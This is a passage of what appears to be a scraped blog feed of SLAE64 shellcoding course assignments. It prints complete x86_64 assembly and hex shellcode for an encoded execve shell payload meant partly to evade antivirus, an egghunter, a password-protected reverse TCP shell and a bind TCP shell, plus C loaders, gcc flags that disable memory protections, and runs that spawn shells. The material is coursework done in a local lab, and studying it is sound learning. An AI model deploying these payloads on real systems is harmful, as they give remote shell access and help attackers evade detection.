bits (al register). cmp cl, 0x08\t; if equal ZF will be set meaning we have a complete rotation jnz decode ; jump if rotation is not complete xor rcx, rcx\t; if rotation is complete and reset cl to start again the \u0026#34;circular array\u0026#34; jmp short decode Compiling and Testing the FlipRotation Decoder Checking assembler.sh output\n╭─edu@debian ~/Desktop/slae_x86_64/assignments/4-Insertion-Encoder-Shellcode ‹main●› ╰─$ ../../assembler.sh flipRotation_decoder.nasm [*] Compiling with NASM [*] Linking [*] Extracting opcodes [*] Done Shellcode size: 146 \u0026#34;\\xeb\\x42\\x49\\xff\\x18\\x02\\x07\\xff\\x8a\\xff\\x94\\xff\\xd5\\x02\\xb8\\x02\\xb1\\xff\\x68\\x02\\xde\\xff\\x8b\\x02\\xc5\\x02\\x27\\x02\\x2d\\xff\\x49\\x02\\xa4\\xff\\x88\\x02\\x73\\x02\\x45\\xff\\x4a\\xff\\x88\\x02\\x7c\\xff\\x59\\x02\\xa4\\xff\\x88\\x02\\xcf\\xff\\x25\\xff\\x50\\x02\\x1c\\xff\\xd1\\x02\\x38\\x02\\x08\\x02\\xa0\\xa0\\x48\\x8d\\x35\\xb7\\xff\\xff\\xff\\x48\\x8d\\x7e\\x01\\x48\\x31\\xc0\\x48\\xf7\\xe0\\xb0\\x01\\x48\\x31\\xc9\\x48\\x31\\xdb\\x8a\\x1c\\x06\\x80\\xf3\\xa0\\x74\\x9d\\x80\\xf3\\x5f\\x8a\\x1c\\x16\\x75\\x04\\xd2\\xcb\\xeb\\x02\\xd2\\xc3\\x80\\xf3\\x01\\x88\\x1c\\x16\\x8a\\x5c\\x06\\x01\\x88\\x1f\\x48\\xff\\xc7\\x04\\x02\\xfe\\xc2\\xfe\\xc1\\x80\\xf9\\x08\\x75\\xd0\\x48\\x31\\xc9\\xeb\\xcb\u0026#34; -------------------- [*] Hack the World! -------------------- No null bytes appear in the shellcode. We are good to go and paste the shellcode to our shellcode.c program\n#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;string.h\u0026gt; unsigned char code[] = \\ \u0026#34;\\xeb\\x42\\x49\\xff\\x18\\x02\\x07\\xff\\x8a\\xff\\x94\\xff\\xd5\\x02\\xb8\\x02\\xb1\\xff\\x68\\x02\\xde\\xff\\x8b\\x02\\xc5\\x02\\x27\\x02\\x2d\\xff\\x49\\x02\\xa4\\xff\\x88\\x02\\x73\\x02\\x45\\xff\\x4a\\xff\\x88\\x02\\x7c\\xff\\x59\\x02\\xa4\\xff\\x88\\x02\\xcf\\xff\\x25\\xff\\x50\\x02\\x1c\\xff\\xd1\\x02\\x38\\x02\\x08\\x02\\xa0\\xa0\\x48\\x8d\\x35\\xb7\\xff\\xff\\xff\\x48\\x8d\\x7e\\x01\\x48\\x31\\xc0\\x48\\xf7\\xe0\\xb0\\x01\\x48\\x31\\xc9\\x48\\x31\\xdb\\x8a\\x1c\\x06\\x80\\xf3\\xa0\\x74\\x9d\\x80\\xf3\\x5f\\x8a\\x1c\\x16\\x75\\x04\\xd2\\xcb\\xeb\\x02\\xd2\\xc3\\x80\\xf3\\x01\\x88\\x1c\\x16\\x8a\\x5c\\x06\\x01\\x88\\x1f\\x48\\xff\\xc7\\x04\\x02\\xfe\\xc2\\xfe\\xc1\\x80\\xf9\\x08\\x75\\xd0\\x48\\x31\\xc9\\xeb\\xcb\u0026#34;; main() { printf(\u0026#34;Shellcode Length: %d\\n\u0026#34;, strlen(code)); int (*ret)() = (int(*)())code; ret(); } Compiling with gcc and executing it\n╭─edu@debian ~/Desktop/slae_x86_64/assignments/4-Insertion-Encoder-Shellcode ‹main●› ╰─$ gcc -fno-stack-protector -z execstack -o shellcode shellcode.c shellcode.c:7:1: warning: return type defaults to ‘int’ [-Wimplicit-int] main() { ^~~~ ╭─edu@debian ~/Desktop/slae_x86_64/assignments/4-Insertion-Encoder-Shellcode ‹main●› ╰─$ ./shellcode Shellcode Length: 146 $ whoami edu $ ls core exploitdb flipRotation_Encoder.py flipRotation_decoder flipRotation_decoder.nasm flipRotation_decoder.o shellcode shellcode.c $ We get a shell!!!\nThis blog post has been created for completing the requirements of the x86_64 Assembly Language and Shellcoding on Linux (SLAE64): https://www.pentesteracademy.com/course?id=7\nStudent ID: PA-31319\nAll the source code files are available on GitHub at https://github.com/0xnibbles/slae_x86_64\n","permalink":"https://0xnibbles.github.io/posts/slae64/slae_64_assignment_4/","summary":"This post introduces my 4th mission of my SLAE64 journey.\nIntroduction The fourth assignment goal was to create my own custom encoder and decoder of the execve stack shellcode. As you may know, the purpose is to execute /bin/sh A shellcode encoder can be used for different purposes, making it harder to detect by AV engines or simply avoiding bad characters (such as null bytes).\nThere is a lot of overlap information with my post regarding the SLAE32 - Custom Encoder/Decoder Shellcode (FlipRotation Encoder/Decoder).","title":"SLAE64 Assignment 4 - Custom Encoder/Decoder Shellcode (FlipRotation Encoder/Decoder)"},{"content":" This post introduces my 3rd mission of my SLAE64 journey.\nIntroduction The primary goal for the third SLAE64 assignment is to create an egghunter shellcode with the following requirements:\nCreate a working demo of the Egghunter; The shellcode should be null-free; With the ability to be configurable for different payloads. Creating an Egghunter Shellcode There is a lot of overlap information with my post regarding the SLAE32 Egghunter Shellcode. I advise you to look at it if you haven’t done it already. There are some essential concepts and ideas to understand what and why the shellcode is doing.\nSo my challenge was to port the 32-bit to the 64-bit version and see what differences needed to be applied.\n\u0026ldquo;Assembling\u0026rdquo; our Egghunter As the shellcode is similar to the 32-bit version, I\u0026rsquo;ll put directly the final commented version below.\n; Student ID : PA-31319 ; Student Name : Eduardo Silva ; Assignment 3 : Egghunter Shellcode (Linux/x86_64) Assembly ; File Name : egg_hunter.nasm global _start section .text _start: xor rcx, rcx mul rcx ; zeroes rax and rdx too page_alignment: or dx, 0xfff ; sets dx to 4095 address_inspection: inc rdx ; sets dx to 4096 xor rsi, rsi ; mode 0 in rsi mov rdi, rdx ; move memory address rdi xor rax,rax add al, 21 ; sys_access syscall syscall cmp al, 0xf2 ; checking if sys_access result in EFAULT exception jz page_alignment mov rax, 0x5090509050905090 ; egg to search in memory mov rdi, rdx ; comparing egg with memory location scasq jnz address_inspection ; move to next address and inspect doing ;all process again scasq ; checking for double egg jnz address_inspection jmp rdi ; we found our egg!!! Compiling and Testing the Shellcode Checking assembler.sh output\n╭─edu@debian ~/Desktop/slae_x86_64/assignments/3-Egg-Hunter-Shellcode ‹main●› ╰─$ ../../assembler.sh egghunter.nasm [*] Compiling with NASM [*] Linking [*] Extracting opcodes [*] Done Shellcode size: 54 \u0026#34;\\x48\\x31\\xc9\\x48\\xf7\\xe1\\x66\\x81\\xca\\xff\\x0f\\x48\\xff\\xc2\\x48\\x31\\xf6\\x48\\x89\\xd7\\x48\\x31\\xc0\\x04\\x15\\x0f\\x05\\x3c\\xf2\\x74\\xe7\\x48\\xb8\\x90\\x50\\x90\\x50\\x90\\x50\\x90\\x50\\x48\\x89\\xd7\\x48\\xaf\\x75\\xdb\\x48\\xaf\\x75\\xd7\\xff\\xe7\u0026#34; -------------------- [*] Hack the World! -------------------- No null bytes appear in the shellcode. We are good to go and paste the shellcode to our shellcode.c program\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; unsigned char egghunter[] = \u0026#34;\\x48\\x31\\xc9\\x48\\xf7\\xe1\\x66\\x81\\xca\\xff\\x0f\\x48\\xff\\xc2\\x48\\x31\\xf6\\x48\\x89\\xd7\\x48\\x31\\xc0\\x04\\x15\\x0f\\x05\\x3c\\xf2\\x74\\xe7\\x48\\xb8\\x90\\x50\\x90\\x50\\x90\\x50\\x90\\x50\\x48\\x89\\xd7\\x48\\xaf\\x75\\xdb\\x48\\xaf\\x75\\xd7\\xff\\xe7\u0026#34;; unsigned char shellcode[] = \\ \u0026#34;\\x90\\x50\\x90\\x50\\x90\\x50\\x90\\x50\u0026#34; \u0026#34;\\x90\\x50\\x90\\x50\\x90\\x50\\x90\\x50\u0026#34; \u0026#34;\\x48\\x31\\xc0\\x50\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x53\\x48\\x89\\xe7\\x50\\x48\\x89\\xe2\\x57\\x48\\x89\\xe6\\x48\\x83\\xc0\\x3b\\x0f\\x05\u0026#34;; int main(void) { printf(\u0026#34;Egg hunter length: %d\\n\u0026#34;, strlen(egghunter)); printf(\u0026#34;Shellcode length: %d\\n\u0026#34;, strlen(shellcode)); printf(\u0026#34;Memory Location of Shellcode: %p\\n\u0026#34;, shellcode); printf(\u0026#34;Memory Location of EggHunter: %p\\n\u0026#34;, egghunter); int (*ret)() = (int(*)())egghunter; ret(); return 0; } To execute a shell I used the execve shellcode stack covered during the course.\n# gcc and its modern protections - PIE (Position Independent Code) After compiling and retesting the code multiple times it always had abnormal beahviour and I couldn\u0026rsquo;t make it work for anything.\nAfter some researchign I found out teh reason for that it was due to, gcc in my machine being compile by default with PIE protection enabled.\nMore info here\nthe conclusion is our egghunter shellcode in not position independent code. The solution was to compile it with gcc with the aditional flag -no-pie as stated in the docs.\nCompiling with gcc and executing it\n╭╭─edu@debian ~/Desktop/slae_x86_64/assignments/3-Egg-Hunter-Shellcode ‹main●› ╰─$ gcc -fno-stack-protector -z execstack -o shellcode shellcode.c -no-pie ╭─edu@debian ~/Desktop/slae_x86_64/assignments/3-Egg-Hunter-Shellcode ‹main●› ╰─$ ./shellcode Egg hunter length: 54 Shellcode length: 48 Memory Location of Shellcode: 0x4040a0 Memory Location of EggHunter: 0x404060 $ whoami edu $ We get a shell!!!\nThis blog post has been created for completing the requirements of the x86_64 Assembly Language and Shellcoding on Linux (SLAE64): https://www.pentesteracademy.com/course?id=7\nStudent ID: PA-31319\nAll the source code files are available on GitHub at https://github.com/0xnibbles/slae_x86_64\n","permalink":"https://0xnibbles.github.io/posts/slae64/slae_64_assignment_3/","summary":"This post introduces my 3rd mission of my SLAE64 journey.\nIntroduction The primary goal for the third SLAE64 assignment is to create an egghunter shellcode with the following requirements:\nCreate a working demo of the Egghunter; The shellcode should be null-free; With the ability to be configurable for different payloads. Creating an Egghunter Shellcode There is a lot of overlap information with my post regarding the SLAE32 Egghunter Shellcode. I advise you to look at it if you haven’t done it already.","title":"SLAE64 Assignment 3 - Egghunter Shellcode"},{"content":" This post introduces my 2nd mission of my SLAE64 journey.\nIntroduction The main goal for the second SLAE64 assignment is to develop a reverse TCP shellcode with the following requirements:\nThe reverse shell connects to the configured IP and port; The user needs to provide a correct password Executing a shell on incoming connection if the password is valid; The shellcode should be null-free; Creating a TCP Reverse Shellcode There is a lot of overlap information with my post regarding the SLAE32 TCP Reverse Shellcode. I advise you to look at it if you haven’t done it already. There are some essential concepts and ideas to understand what and why the shellcode is doing.\nFor this assignment I took the TCP Bind Shellcode used during the course as a reference. The following is already changed to work with a custom password. The same as assignment 1 - SLAE64 TCP Reverse Shellcode\nThe chosen password is again isolemnlyswearthatiamuptonogood.\nThis a 31-byte size string, but our buffer has 32 bytes in size because of the newline byte when we press enter key.\nThis time i\u0026rsquo;ll directly to the null byte-free shellcode. If you want to look for a more detailed analysis, please check the Nulls? Get out of here! section of the previous assignment.\nAdding the ask password part to the final shellcode becomes as follows:\n; Student ID : PA-31319 ; Student Name : Eduardo Silva ; Assignment 1 : TCP Reverse Shell (Linux/x86_64) Assembly ; File Name : reverse-shell-password.nasm global _start _start: jmp main ask_pass: db \u0026#34;Tell me the passcode\u0026#34;, 0xa main: ; sock = socket(AF_INET, SOCK_STREAM, 0) ; AF_INET = 2 ; SOCK_STREAM = 1 ; syscall number 41 xor rsi, rsi mul rsi add rax, 41 push byte 0x2 pop rdi inc rsi ;xor rdx, rdx syscall ; copy socket descriptor to rdi for future use xchg rdi, rax ; server.sin_family = AF_INET ; server.sin_port = htons(PORT) ; server.sin_addr.s_addr = INADDR_ANY ; bzero(\u0026amp;server.sin_zero, 8) xor rax, rax push rax ; pushing 0.0.0.0 into in_addr push word 0x2923 ;little endian -\u0026gt; 9001 = 0x2329 ; byte first ... 0x115C is 4444) push word 0x2 ; AF_INET - which is 0x02 mov rsi, rsp ; moving stack address to rsi ; connect(sock, (struct sockaddr *)\u0026amp;server, sockaddr_len) xor rax, rax mov rdx, rax add rax, 42 mov rsi, rsp add rdx, 16 syscall ; duplicate sockets ; dup2 (new, old) xor rax, rax mov al, 33 xor rsi, rsi syscall mov al, 33 inc rsi syscall mov al, 33 inc rsi syscall ; ############ asking for password ------------------------------ password: ; sys_write ; rax : 1 - write syscall number ; rdi : unsigned int fd : 1 for stdout ; rsi : const char *buf : password buffer ; rdx : size_t count : password size xor rax, rax xor rdx, rdx ; or cqo?? inc rax mov rdi, rax lea rsi, [rel ask_pass] mov dl, 21 syscall ; sys_read ; rdi : unsigned int fd : 0 for stdin ; rsi : char *buf : stack? ; rdx : size_t count : how big xor rdx, rdx xor rax, rax xor rdi, rdi ; rax is already zero mov rsi, rsp add rdx, 32 ;password size syscall mov rdi, rsp xor rsi, rsi push rsi mov rsi, 0x0a646f6f676f6e6f ; \\ndoogono --\u0026gt; \\n - new line byte = 0x0a push rsi mov rsi, 0x7470756d61697461 ; tpumaita push rsi mov rsi, 0x6874726165777379 ; htraewsy push rsi mov rsi, 0x6c6e6d656c6f7369 ; lnmelosi push rsi mov rsi, rsp ; password buffer pointer xor rcx, rcx add rcx, 32 ; 31 bytes for password and 1 byte for newline char repe cmpsb jne password ; ###### ------------------------------------------ ; execve ; First NULL push xor rax, rax push rax ; push /bin//sh in reverse mov rbx, 0x68732f2f6e69622f push rbx ; store /bin//sh address in RDI mov rdi, rsp ; Second NULL push push rax ; set RDX mov rdx, rsp ; Push address of /bin//sh push rdi ; set RSI mov rsi, rsp ; Call the Execve syscall add rax, 59 syscall We can verify the shellcode does not have null bytes as shown below with objdump\nobjdump -M intel -d shell-bind-password shell-bind-password: file format elf64-x86-64 Disassembly of section .text: 0000000000401000 \u0026lt;_start\u0026gt;: 401000:\teb 15 jmp 401017 \u0026lt;main\u0026gt; 0000000000401002 \u0026lt;ask_pass\u0026gt;: 401002:\t54 push rsp 401003:\t65 6c gs ins BYTE PTR es:[rdi],dx 401005:\t6c ins BYTE PTR es:[rdi],dx 401006:\t20 6d 65 and BYTE PTR [rbp+0x65],ch 401009:\t20 74 68 65 and BYTE PTR [rax+rbp*2+0x65],dh 40100d:\t20 70 61 and BYTE PTR [rax+0x61],dh 401010:\t73 73 jae 401085 \u0026lt;password+0x9\u0026gt; 401012:\t63 6f 64 movsxd ebp,DWORD PTR [rdi+0x64] 401015:\t65 gs 401016:\t0a .byte 0xa 0000000000401017 \u0026lt;main\u0026gt;: 401017:\t48 31 f6 xor rsi,rsi 40101a:\t48 f7 e6 mul rsi 40101d:\t48 83 c0 29 add rax,0x29 401021:\t6a 02 push 0x2 401023:\t5f pop rdi 401024:\t48 ff c6 inc rsi 401027:\t0f 05 syscall 401029:\t48 97 xchg rdi,rax 40102b:\t48 31 c0 xor rax,rax 40102e:\t50 push rax 40102f:\t66 68 23 29 pushw 0x2923 401033:\t66 6a 02 pushw 0x2 401036:\t48 89 e6 mov rsi,rsp 401039:\t48 83 c2 10 add rdx,0x10 40103d:\t48 83 c0 31 add rax,0x31 401041:\t0f 05 syscall 401043:\t48 31 c0 xor rax,rax 401046:\t48 89 c2 mov rdx,rax 401049:\t48 83 c2 01 add rdx,0x1 40104d:\t48 83 c0 32 add rax,0x32 401051:\t0f 05 syscall 401053:\t48 31 c0 xor rax,rax 401056:\t48 89 c6 mov rsi,rax 401059:\t48 89 c2 mov rdx,rax 40105c:\t48 83 c0 2b add rax,0x2b 401060:\t0f 05 syscall 401062:\t48 97 xchg rdi,rax 401064:\t4d 31 c9 xor r9,r9 0000000000401067 \u0026lt;loopin\u0026gt;: 401067:\t48 31 c0 xor rax,rax 40106a:\t48 83 c0 21 add rax,0x21 40106e:\t4c 89 ce mov rsi,r9 401071:\t0f 05 syscall 401073:\t49 ff c1 inc r9 401076:\t49 83 f9 03 cmp r9,0x3 40107a:\t75 eb jne 401067 \u0026lt;loopin\u0026gt; 000000000040107c \u0026lt;password\u0026gt;: 40107c:\t48 31 c0 xor rax,rax 40107f:\t48 31 d2 xor rdx,rdx 401082:\t48 ff c0 inc rax 401085:\t48 89 c7 mov rdi,rax 401088:\t48 8d 35 73 ff ff ff lea rsi,[rip+0xffffffffffffff73] # 401002 \u0026lt;ask_pass\u0026gt; 40108f:\tb2 15 mov dl,0x15 401091:\t0f 05 syscall 401093:\t48 31 d2 xor rdx,rdx 401096:\t48 31 c0 xor rax,rax 401099:\t48 31 ff xor rdi,rdi 40109c:\t48 89 e6 mov rsi,rsp 40109f:\t48 83 c2 20 add rdx,0x20 4010a3:\t0f 05 syscall 4010a5:\t48 89 e7 mov rdi,rsp 4010a8:\t48 31 f6 xor rsi,rsi 4010ab:\t56 push rsi 4010ac:\t48 be 6f 6e 6f 67 6f movabs rsi,0xa646f6f676f6e6f 4010b3:\t6f 64 0a 4010b6:\t56 push rsi 4010b7:\t48 be 61 74 69 61 6d movabs rsi,0x7470756d61697461 4010be:\t75 70 74 4010c1:\t56 push rsi 4010c2:\t48 be 79 73 77 65 61 movabs rsi,0x6874726165777379 4010c9:\t72 74 68 4010cc:\t56 push rsi 4010cd:\t48 be 69 73 6f 6c 65 movabs rsi,0x6c6e6d656c6f7369 4010d4:\t6d 6e 6c 4010d7:\t56 push rsi 4010d8:\t48 89 e6 mov rsi,rsp 4010db:\t48 31 c9 xor rcx,rcx 4010de:\t80 c1 20 add cl,0x20 4010e1:\tf3 a6 repz cmps BYTE PTR ds:[rsi],BYTE PTR es:[rdi] 4010e3:\t75 97 jne 40107c \u0026lt;password\u0026gt; 4010e5:\t48 31 c0 xor rax,rax 4010e8:\t50 push rax 4010e9:\t48 bb 2f 62 69 6e 2f movabs rbx,0x68732f2f6e69622f 4010f0:\t2f 73 68 4010f3:\t53 push rbx 4010f4:\t48 89 e7 mov rdi,rsp 4010f7:\t50 push rax 4010f8:\t48 89 e2 mov rdx,rsp 4010fb:\t57 push rdi 4010fc:\t48 89 e6 mov rsi,rsp 4010ff:\t48 83 c0 3b add rax,0x3b 401103:\t0f 05 syscall From the output we can verify the null bytes were gone effectively.\nCompiling and Testing the Shellcode To be easier to compile my shellcode scripts and get the size and the opcodes I\u0026rsquo;ll use the 64-bit version of assembler.sh.\nAvailable in https://github.com/0xnibbles/slae_x86_64/blob/main/assembler.sh\nChecking assembler.sh output\n╭─edu@debian ~/Desktop/slae_x86_64/assignments/2-shell-reverse-tcp-password-shellcode ‹main●› ╰─$ ../../assembler.sh reverse-shell-password.nasm [*] Compiling with NASM [*] Linking [*] Extracting opcodes [*] Done Shellcode size: 238 \u0026#34;\\xeb\\x15\\x54\\x65\\x6c\\x6c\\x20\\x6d\\x65\\x20\\x74\\x68\\x65\\x20\\x70\\x61\\x73\\x73\\x63\\x6f\\x64\\x65\\x0a\\x48\\x31\\xf6\\x48\\xf7\\xe6\\x48\\x83\\xc0\\x29\\x6a\\x02\\x5f\\x48\\xff\\xc6\\x0f\\x05\\x48\\x97\\x48\\x31\\xc0\\x50\\x66\\x68\\x23\\x29\\x66\\x6a\\x02\\x48\\x89\\xe6\\x48\\x31\\xc0\\x48\\x89\\xc2\\x48\\x83\\xc0\\x2a\\x48\\x89\\xe6\\x48\\x83\\xc2\\x10\\x0f\\x05\\x48\\x31\\xc0\\xb0\\x21\\x48\\x31\\xf6\\x0f\\x05\\xb0\\x21\\x48\\xff\\xc6\\x0f\\x05\\xb0\\x21\\x48\\xff\\xc6\\x0f\\x05\\x48\\x31\\xc0\\x48\\x31\\xd2\\x48\\xff\\xc0\\x48\\x89\\xc7\\x48\\x8d\\x35\\x8b\\xff\\xff\\xff\\xb2\\x15\\x0f\\x05\\x48\\x31\\xd2\\x48\\x31\\xc0\\x48\\x31\\xff\\x48\\x89\\xe6\\x48\\x83\\xc2\\x20\\x0f\\x05\\x48\\x89\\xe7\\x48\\x31\\xf6\\x56\\x48\\xbe\\x6f\\x6e\\x6f\\x67\\x6f\\x6f\\x64\\x0a\\x56\\x48\\xbe\\x61\\x74\\x69\\x61\\x6d\\x75\\x70\\x74\\x56\\x48\\xbe\\x79\\x73\\x77\\x65\\x61\\x72\\x74\\x68\\x56\\x48\\xbe\\x69\\x73\\x6f\\x6c\\x65\\x6d\\x6e\\x6c\\x56\\x48\\x89\\xe6\\x48\\x31\\xc9\\x48\\x83\\xc1\\x20\\xf3\\xa6\\x75\\x96\\x48\\x31\\xc0\\x50\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x53\\x48\\x89\\xe7\\x50\\x48\\x89\\xe2\\x57\\x48\\x89\\xe6\\x48\\x83\\xc0\\x3b\\x0f\\x05\u0026#34; -------------------- [*] Hack the World! -------------------- No null bytes appear in the shellcode. We are good to go and paste the shellcode to our shellcode.c program\n#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;string.h\u0026gt; unsigned char code[] = \\ \u0026#34;\\xeb\\x15\\x54\\x65\\x6c\\x6c\\x20\\x6d\\x65\\x20\\x74\\x68\\x65\\x20\\x70\\x61\\x73\\x73\\x63\\x6f\\x64\\x65\\x0a\\x48\\x31\\xf6\\x48\\xf7\\xe6\\x48\\x83\\xc0\\x29\\x6a\\x02\\x5f\\x48\\xff\\xc6\\x0f\\x05\\x48\\x97\\x48\\x31\\xc0\\x50\\x66\\x68\\x23\\x29\\x66\\x6a\\x02\\x48\\x89\\xe6\\x48\\x31\\xc0\\x48\\x89\\xc2\\x48\\x83\\xc0\\x2a\\x48\\x89\\xe6\\x48\\x83\\xc2\\x10\\x0f\\x05\\x48\\x31\\xc0\\xb0\\x21\\x48\\x31\\xf6\\x0f\\x05\\xb0\\x21\\x48\\xff\\xc6\\x0f\\x05\\xb0\\x21\\x48\\xff\\xc6\\x0f\\x05\\x48\\x31\\xc0\\x48\\x31\\xd2\\x48\\xff\\xc0\\x48\\x89\\xc7\\x48\\x8d\\x35\\x8b\\xff\\xff\\xff\\xb2\\x15\\x0f\\x05\\x48\\x31\\xd2\\x48\\x31\\xc0\\x48\\x31\\xff\\x48\\x89\\xe6\\x48\\x83\\xc2\\x20\\x0f\\x05\\x48\\x89\\xe7\\x48\\x31\\xf6\\x56\\x48\\xbe\\x6f\\x6e\\x6f\\x67\\x6f\\x6f\\x64\\x0a\\x56\\x48\\xbe\\x61\\x74\\x69\\x61\\x6d\\x75\\x70\\x74\\x56\\x48\\xbe\\x79\\x73\\x77\\x65\\x61\\x72\\x74\\x68\\x56\\x48\\xbe\\x69\\x73\\x6f\\x6c\\x65\\x6d\\x6e\\x6c\\x56\\x48\\x89\\xe6\\x48\\x31\\xc9\\x80\\xc1\\x20\\xf3\\xa6\\x75\\x97\\x48\\x31\\xc0\\x50\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x53\\x48\\x89\\xe7\\x50\\x48\\x89\\xe2\\x57\\x48\\x89\\xe6\\x48\\x83\\xc0\\x3b\\x0f\\x05\u0026#34;; main() { printf(\u0026#34;Shellcode Length: %d\\n\u0026#34;, strlen(code)); int (*ret)() = (int(*)())code; ret(); } Compiling with gcc and executing it\n╭─edu@debian ~/Desktop/slae_x86_64/assignments/2-shell-reverse-tcp-password-shellcode ‹main●› ╰─$ gcc -fno-stack-protector -z execstack -o shellcode shellcode.c shellcode.c:7:1: warning: return type defaults to ‘int’ [-Wimplicit-int] main() { ^~~~ ╭─edu@debian ~/Desktop/slae_x86_64/assignments/2-shell-reverse-tcp-password-shellcode ‹main●› ╰─$ ./shellcode Shellcode Length: 237 --------------- ╭─edu@debian ~/Desktop/slae_x86_64/assignments/1-shell-bind-tcp-password-shellcode ‹main●› ╰─$ nc -lvnp 9001 listening on [any] 9001 ... connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 44000 Tell me the passcode hgdajhsd Tell me the passcode isolemnlyswearthatiamuptonogood whoami edu id uid=1000(edu) gid=1000(edu) ... Oh yeah! We get a connection back and the spawn a shell if th epassword is correct!\nThis blog post has been created for completing the requirements of the x86_64 Assembly Language and Shellcoding on Linux (SLAE64): https://www.pentesteracademy.com/course?id=7\nStudent ID: PA-31319\nAll the source code files are available on GitHub at https://github.com/0xnibbles/slae_x86_64\n","permalink":"https://0xnibbles.github.io/posts/slae64/slae_64_assignment_2/","summary":"This post introduces my 2nd mission of my SLAE64 journey.\nIntroduction The main goal for the second SLAE64 assignment is to develop a reverse TCP shellcode with the following requirements:\nThe reverse shell connects to the configured IP and port; The user needs to provide a correct password Executing a shell on incoming connection if the password is valid; The shellcode should be null-free; Creating a TCP Reverse Shellcode There is a lot of overlap information with my post regarding the SLAE32 TCP Reverse Shellcode.","title":"SLAE64 Assignment 2 - TCP Reverse Shellcode"},{"content":" This post introduces the first mission of my SLAE64 journey.\nIntroduction The main goal for the first SLAE64 assignment is to develop a shellcode for bind TCP shell with the following requirements:\nBinds to a port; Teh user needs to provide a correct password Executing a shell on incoming connection if thepassword is valid; The shellcode should be null-free; Past, present and Future The exercises of SLAE64 are identical to the ones of SLAE32, so for the 64-bit version, I will have a more simple approach.\nIf you want more detailed explanations of some topics, please check the SLAE32-related post, as the principles and ideas are the same.\nThe diff between 32 and 64 bit versions With the increase of memory space in 64-bit ISA, the main differences are mainly extending the general purpose registers to 64-bit size. eax, ebx, rcx, etc becomes rax, rbx, rcx, etc. More info here.\nThe calling conventions approach had a significant update. For the 64-bit, we have the System V ABII; when we call a syscall, the function arguments are first passed into the defined order of registers shown below.\nsyscall param 1 param 2 param 3 param 4 param 5 param 6 rax rdi rsi rdx r8 r9 r10 Other values are passed on the stack in reverse order, as in cdecl. The syscall number should be placed in rax. Also, the return value is stored in rax too.\nFor an x86_64 syscall reference you can use the file /usr/include/x86_64-linux-gnu/asm/uninstd_64.h\nCreating a TCP Bind Shellcode There is a lot of overlap information with my post regarding the SLAE32 TCP Bind Shellcode. I advise you to look at it if you haven’t done it already. There are some essential concepts and ideas to understand what and why the shellcode is doing.\nThe shellcode presented in this post is already changed to work with a custom password.\nThe chosen password is isolemnlyswearthatiamuptonogood.\nThis a 31-byte size string, but our buffer has 32 bytes in size because of the newline byte when we press enter key.\nWe can leverage the helper script revHex64.py to output the password bytes ready to use.\nAvailable at https://github.com/0xnibbles/slae_x86_64/blob/main/revHex64.py\nFor this assignment, I took the TCP Bind Shellcode used during the course as a reference. The shellcode had a lot of null bytes, so I needed to tweak the code a bit.\nAs the first task, let’s remove those null bytes.\nNulls? Get out of here! Many nulls are because of a full register extension such as rax or eax when it only used a part of its bits.\nFor example:\n40109a:\tb8 21 00 00 00 mov eax,0x21 eax has 32 bits in size; when we move 0x21, we only need 1 byte (8 bits). The remaining bits are filled with nulls.\nLet\u0026rsquo;s refactor this code.\nAfter removing the null bytes, a little optimization to use less space and adding the ask password part to the final shellcode, becomes as follows:\n; Student ID : PA-31319 ; Student Name : Eduardo Silva ; Assignment 1 : TCP Bind Shell (Linux/x86_64) Assembly ; File Name : shell-bind-password.nasm global _start _start: jmp main ask_pass: db \u0026#34;Tell me the passcode\u0026#34;, 0xa main: ; sock = socket(AF_INET, SOCK_STREAM, 0) ; AF_INET = 2 ; SOCK_STREAM = 1 ; syscall number 41 xor rsi, rsi mul rsi add rax, 41 push byte 0x2 ; use less space pop rdi inc rsi ;xor rdx, rdx syscall ; copy socket descriptor to rdi for future use xchg rdi, rax ; server.sin_family = AF_INET ; server.sin_port = htons(PORT) ; server.sin_addr.s_addr = INADDR_ANY ; bzero(\u0026amp;server.sin_zero, 8) xor rax, rax push rax ; pushing 0.0.0.0 into in_addr push word 0x2923 ;little endian -\u0026gt; 9001 = 0x2329 ; byte first ... 0x115C is 4444) push word 0x2 ; AF_INET - which is 0x02 mov rsi, rsp ; moving stack address to rsi ; bind(sock, (struct sockaddr *)\u0026amp;server, sockaddr_len) ; syscall number 49 add rdx, 0x10 ;put 16 bytes rdx - size of struct add rax, 0x31 ; set rax to sys_bind syscall ; make the call to bind ; socketid will be in rax ; listen(sock, MAX_CLIENTS) ; syscall number 50 xor rax, rax ; zero out rax ; socketid already in rsi mov rdx, rax ; zeroing out rdx add rdx, 0x01 ; moving backlog number to rdx add rax, 50 ; setting rax to sys_listen syscall ; make call to listen ; new = accept(sock, (struct sockaddr *)\u0026amp;client, \u0026amp;sockaddr_len) ; syscall number 43 xor rax, rax ; zero out rax ; socketid already in rsi mov rsi, rax ; moving null to rsi mov rdx, rax ; moving null to rdx add rax, 43 ; setting rax to sys_connect syscall ; make call to listen ; duplicate sockets ; sys_dup2 xchg rdi, rax ; moves clientid to rdi ; rax : sys_dup2 33 ; rdi : already contains clientid ; rsi : 1 to 3 in loop xor r9, r9 ; zeroing out loop counter loopin: xor rax, rax ; zero out rax add rax, 33 ; setting rax to sys_dup2 mov rsi, r9 ; move fileid to duplicate syscall ; call dup2 inc r9 ; increase r9 by 0x01 cmp r9, 3 ; compare r9 to 0x03 jne loopin ; ############ asking for password ------------------------------ password: ; sys_write ; rax : 1 - write syscall number ; rdi : unsigned int fd : 1 for stdout ; rsi : const char *buf : password buffer ; rdx : size_t count : password size xor rax, rax xor rdx, rdx ; or cqo?? inc rax mov rdi, rax lea rsi, [rel ask_pass] mov dl, 21 syscall ; sys_read ; rdi : unsigned int fd : 0 for stdin ; rsi : char *buf : stack? ; rdx : size_t count : how big xor rdx, rdx xor rax, rax xor rdi, rdi ; rax is already zero mov rsi, rsp add rdx, 32 ;password size syscall mov rdi, rsp xor rsi, rsi push rsi mov rsi, 0x0a646f6f676f6e6f ; \\ndoogono --\u0026gt; \\n - new line byte = 0x0a push rsi mov rsi, 0x7470756d61697461 ; tpumaita push rsi mov rsi, 0x6874726165777379 ; htraewsy push rsi mov rsi, 